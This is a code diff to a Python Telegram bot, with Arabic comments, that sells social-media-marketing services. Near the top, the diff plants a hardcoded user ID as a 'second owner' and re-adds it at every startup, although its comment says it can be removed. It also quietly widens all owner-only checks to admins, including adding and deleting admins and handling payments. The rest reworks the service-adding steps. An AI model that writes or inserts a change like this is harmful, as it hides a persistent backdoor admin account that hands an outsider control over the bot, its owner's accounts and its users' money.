@@ -269,6 +269,12 @@ def save_extra_admins():
 
 extra_admins: set = load_extra_admins()
 
+# المالك الثاني الافتراضي (قابل للإزالة من لوحة المالك الأول)
+_OWNER2_ID = 7790016766
+if _OWNER2_ID not in extra_admins:
+    extra_admins.add(_OWNER2_ID)
+    save_extra_admins()
+
 
 def is_admin(uid: int) -> bool:
     return uid == ADMIN_ID or uid in extra_admins
@@ -1369,14 +1375,14 @@ async def cmd_start(msg: types.Message):
         except Exception:
             pass
 
-    if msg.from_user.id == ADMIN_ID:
+    if is_admin(msg.from_user.id):
         await msg.answer(
             "⚙️ <b>لوحة المالك</b>\n\nمن هنا تتحكم بكل شيء.",
             parse_mode='HTML',
             reply_markup=admin_main_keyboard(),
         )
 
-    if settings.get("maintenance_mode", False) and msg.from_user.id != ADMIN_ID:
+    if settings.get("maintenance_mode", False) and not is_admin(msg.from_user.id):
         await msg.answer(settings.get("maintenance_text", "🚧 البوت تحت الصيانة."))
         return
 
@@ -1398,7 +1404,7 @@ async def cmd_start(msg: types.Message):
 
 @dp.message_handler(commands=['admin'])
 async def cmd_admin(msg: types.Message):
-    if msg.from_user.id != ADMIN_ID:
+    if not is_admin(msg.from_user.id):
         await msg.answer("❌ هذا الأمر مخصص للمالك فقط.")
         return
     await msg.answer(
@@ -1414,7 +1420,7 @@ async def cmd_cancel(msg: types.Message):
     if msg.from_user.id in user_state:
         user_state.pop(msg.from_user.id, None)
         cancelled = True
-    if msg.from_user.id == ADMIN_ID and ADMIN_ID in admin_state:
+    if is_admin(msg.from_user.id) and ADMIN_ID in admin_state:
         admin_state.pop(ADMIN_ID, None)
         cancelled = True
     if cancelled:
@@ -1426,7 +1432,7 @@ async def cmd_cancel(msg: types.Message):
 # -------- أوامر SMM للمالك --------
 @dp.message_handler(commands=['smm_balance'])
 async def cmd_smm_balance(msg: types.Message):
-    if msg.from_user.id != ADMIN_ID:
+    if not is_admin(msg.from_user.id):
         return
     parts = []
     for key, info in PROVIDERS.items():
@@ -1442,7 +1448,7 @@ async def cmd_smm_balance(msg: types.Message):
 @dp.message_handler(commands=['smm_test'])
 async def cmd_smm_test(msg: types.Message):
     """تشخيص: /smm_test <smmfollows|jap> <service_id>"""
-    if msg.from_user.id != ADMIN_ID:
+    if not is_admin(msg.from_user.id):
         return
     args = (msg.get_args() or "").strip().split()
     if len(args) < 2:
@@ -1514,7 +1520,7 @@ async def cmd_smm_test(msg: types.Message):
 
 @dp.message_handler(commands=['smm_status'])
 async def cmd_smm_status(msg: types.Message):
-    if msg.from_user.id != ADMIN_ID:
+    if not is_admin(msg.from_user.id):
         return
     args = (msg.get_args() or "").strip().split()
     if len(args) < 1:
@@ -1558,7 +1564,7 @@ async def cmd_smm_status(msg: types.Message):
 
 @dp.message_handler(commands=['smm_orders'])
 async def cmd_smm_orders(msg: types.Message):
-    if msg.from_user.id != ADMIN_ID:
+    if not is_admin(msg.from_user.id):
         return
     if not smm_orders:
         await msg.answer("لا توجد طلبات SMM مسجلة بعد.")
@@ -1772,7 +1778,7 @@ async def cb_asia_amt(c: types.CallbackQuery):
 
 @dp.callback_query_handler(lambda c: c.data and c.data.startswith("asia:"))
 async def cb_asia_admin(c: types.CallbackQuery):
-    if c.from_user.id != ADMIN_ID:
+    if not is_admin(c.from_user.id):
         await c.answer("❌ مخصص للمالك.", show_alert=True)
         return
     parts = c.data.split(":")
@@ -1845,7 +1851,7 @@ async def cb_fsub_check(c: types.CallbackQuery):
 @dp.callback_query_handler(lambda c: c.data and c.data.startswith("u:"))
 async def cb_user(c: types.CallbackQuery):
     register_user(c.from_user.id)
-    if settings.get("maintenance_mode", False) and c.from_user.id != ADMIN_ID:
+    if settings.get("maintenance_mode", False) and not is_admin(c.from_user.id):
         await c.answer(settings.get("maintenance_text", "🚧 صيانة"), show_alert=True)
         return
     if not await enforce_subscription(c):
@@ -1878,7 +1884,7 @@ async def cb_user(c: types.CallbackQuery):
 # ================================================================
 @dp.callback_query_handler(lambda c: c.data and c.data.startswith("a:"))
 async def cb_admin(c: types.CallbackQuery):
-    if c.from_user.id != ADMIN_ID:
+    if not is_admin(c.from_user.id):
         await c.answer("❌ هذا الزر للمالك فقط.", show_alert=True)
         return
 
@@ -2026,7 +2032,7 @@ async def cb_admin(c: types.CallbackQuery):
 
     # ─── إدارة الادمنز ───
     if action == "admins":
-        if c.from_user.id != ADMIN_ID:
+        if not is_admin(c.from_user.id):
             await c.answer("⛔ هذا الخيار للمالك فقط.", show_alert=True)
             return
         await c.answer()
@@ -2045,7 +2051,7 @@ async def cb_admin(c: types.CallbackQuery):
         return
 
     if action == "admin_add":
-        if c.from_user.id != ADMIN_ID:
+        if not is_admin(c.from_user.id):
             await c.answer("⛔ هذا الخيار للمالك فقط.", show_alert=True)
             return
         admin_state[ADMIN_ID] = {"action": "admin_add"}
@@ -2058,7 +2064,7 @@ async def cb_admin(c: types.CallbackQuery):
         return
 
     if action == "admin_del":
-        if c.from_user.id != ADMIN_ID:
+        if not is_admin(c.from_user.id):
             await c.answer("⛔ هذا الخيار للمالك فقط.", show_alert=True)
             return
         target_id = int(parts[2])
@@ -2220,15 +2226,11 @@ async def cb_admin(c: types.CallbackQuery):
             admin_state[ADMIN_ID] = {
                 "action": "add_top", "where": where, "kind": kind, "step": 35, "tmp": {}
             }
+        admin_state[ADMIN_ID]["step"] = 1
         await c.answer()
         if kind == "service_item":
-            await c.message.answer(
-                "🔌 أولاً اختر <b>المزوّد</b> الذي ستُربط به هذه الخدمة:",
-                parse_mode='HTML',
-                reply_markup=provider_picker_keyboard("new", edit_mode=False),
-            )
+            await c.message.answer("📝 أرسل <b>اسم الخدمة</b> كما ستظهر للمستخدمين:", parse_mode='HTML')
         else:
-            admin_state[ADMIN_ID]["step"] = 1
             await c.message.answer("📝 أرسل اسم الزر الجديد (مثال: 🆕 خيار جديد):")
         return
 
@@ -2501,9 +2503,9 @@ async def cb_admin(c: types.CallbackQuery):
         if prov == "manual":
             st["tmp"]["smm_provider"] = ""
             st["tmp"]["smm_service_id"] = 0
-            st["step"] = 1
+            st["step"] = 3
             await c.answer()
-            await c.message.answer("📝 أرسل <b>اسم الخدمة</b> كما ستظهر للمستخدمين:", parse_mode='HTML')
+            await c.message.answer("💰 أرسل <b>سعر الخدمة</b> بالنقاط لكل 1000 (رقم فقط):", parse_mode='HTML')
             return
         if prov not in PROVIDERS:
             await c.answer("⚠️ مزوّد غير معروف", show_alert=True)
@@ -2833,7 +2835,7 @@ async def _process_user_flow(msg: types.Message) -> bool:
 # ================================================================
 #               استقبال إدخال المالك النصي حسب الحالة
 # ================================================================
-@dp.message_handler(lambda m: m.from_user.id == ADMIN_ID and ADMIN_ID in admin_state)
+@dp.message_handler(lambda m: is_admin(m.from_user.id) and ADMIN_ID in admin_state)
 async def admin_input(msg: types.Message):
     state = admin_state[ADMIN_ID]
     text = msg.text or ""
@@ -3260,8 +3262,12 @@ async def _add_flow(msg: types.Message, state: dict, parent, where):
             await msg.answer("📝 الآن أرسل نص الرد الذي يظهر عند الضغط:")
             return
         if kind == "service_item":
-            state["step"] = 3
-            await msg.answer("📝 أرسل سعر الخدمة بالنقاط لكل 1000 (رقم فقط):")
+            state["step"] = 35
+            await msg.answer(
+                "🔌 اختر <b>المزوّد</b> الذي ستُربط به هذه الخدمة:",
+                parse_mode='HTML',
+                reply_markup=provider_picker_keyboard("new", edit_mode=False),
+            )
             return
         # الأنواع الأخرى لا تحتاج بيانات إضافية
         new_item = {
@@ -3293,42 +3299,8 @@ async def _add_flow(msg: types.Message, state: dict, parent, where):
             await msg.answer("⚠️ أرسل رقماً صحيحاً للسعر.")
             return
         state["tmp"]["price"] = price
-        prov    = state["tmp"].get("smm_provider", "")
-        smm_sid = int(state["tmp"].get("smm_service_id", 0) or 0)
-        # --- SMM: كل البيانات محضّرة مسبقاً، نحفظ مباشرة ---
-        if smm_sid > 0 and prov:
-            new_item = {
-                "id":             new_id(),
-                "label":          state["tmp"].get("label", f"خدمة {smm_sid}"),
-                "kind":           "service_item",
-                "text":           "",
-                "price":          price,
-                "smm_provider":   prov,
-                "smm_service_id": smm_sid,
-                "description":    state["tmp"].get("description", ""),
-                "min_qty":        int(state["tmp"].get("min_qty", 10)),
-                "max_qty":        int(state["tmp"].get("max_qty", 10000)),
-                "children":       [],
-            }
-            _commit(new_item)
-            admin_state.pop(ADMIN_ID, None)
-            await msg.answer(
-                f"✅ <b>تم إضافة الخدمة بنجاح!</b>\n\n"
-                f"📌 الاسم: {new_item['label']}\n"
-                f"🔌 المزوّد: {provider_label(prov)}\n"
-                f"🆔 رقم الخدمة: <code>{smm_sid}</code>\n"
-                f"💰 السعر: {price} نقطة / 1000\n"
-                f"🔢 العدد: {new_item['min_qty']:,} – {new_item['max_qty']:,}",
-                parse_mode='HTML',
-                reply_markup=admin_main_keyboard(),
-            )
-            return
-        # --- يدوي: اطلب الوصف ثم min/max ---
-        state["step"] = 5
-        await msg.answer(
-            "📝 أرسل وصف الخدمة (يظهر للمشترك).\n"
-            "إذا لا تريد وصفاً أرسل: -"
-        )
+        state["step"] = 6
+        await msg.answer("🔻 أرسل <b>الحد الأدنى</b> للطلب (مثال: 100):", parse_mode='HTML')
         return
 
     if state["step"] == 4:
@@ -3338,41 +3310,10 @@ async def _add_flow(msg: types.Message, state: dict, parent, where):
         except ValueError:
             await msg.answer("⚠️ أرسل رقماً صحيحاً موجباً لرقم الخدمة.")
             return
-        prov = state["tmp"].get("smm_provider", "")
-        wait_msg = await msg.answer(f"⏳ جارٍ جلب تفاصيل الخدمة <code>{sid}</code> من {provider_label(prov)}...", parse_mode='HTML')
-        svc_info = await smm_fetch_service_info(prov, sid)
-        try:
-            await bot.delete_message(msg.chat.id, wait_msg.message_id)
-        except Exception:
-            pass
-        if not svc_info:
-            await msg.answer(
-                f"⚠️ لم يُعثر على خدمة برقم <code>{sid}</code> في {provider_label(prov)}.\n\n"
-                f"الأسباب المحتملة:\n"
-                f"• الرقم خاطئ، تحقق من الموقع مباشرةً\n"
-                f"• مفتاح API غير مضبوط أو منتهي الصلاحية\n"
-                f"• الخدمة غير متاحة في حسابك\n\n"
-                f"أعد إرسال الرقم أو أرسل /cancel للإلغاء.",
-                parse_mode='HTML',
-            )
-            return
-        svc_name = (svc_info.get("name") or svc_info.get("service_name") or f"خدمة {sid}").strip()
-        svc_min  = int(svc_info.get("min", svc_info.get("min_qty", 10)) or 10)
-        svc_max  = int(svc_info.get("max", svc_info.get("max_qty", 10000)) or 10000)
-        svc_desc = (svc_info.get("description") or "").strip()
         state["tmp"]["smm_service_id"] = sid
-        state["tmp"]["label"]          = svc_name
-        state["tmp"]["min_qty"]        = svc_min
-        state["tmp"]["max_qty"]        = svc_max
-        state["tmp"]["description"]    = svc_desc
         state["step"] = 3
-        desc_line = f"\n📄 <b>الوصف:</b>\n<blockquote expandable>{svc_desc}</blockquote>" if svc_desc else ""
         await msg.answer(
-            f"✅ <b>تم جلب تفاصيل الخدمة تلقائياً:</b>\n\n"
-            f"📌 <b>الاسم:</b> {svc_name}\n"
-            f"🔢 <b>الحد الأدنى:</b> {svc_min:,}\n"
-            f"🔢 <b>الحد الأقصى:</b> {svc_max:,}"
-            f"{desc_line}\n\n"
+            f"✅ رقم الخدمة: <code>{sid}</code>\n\n"
             f"💰 الآن أرسل <b>سعر الخدمة</b> بالنقاط لكل 1000:",
             parse_mode='HTML',
         )
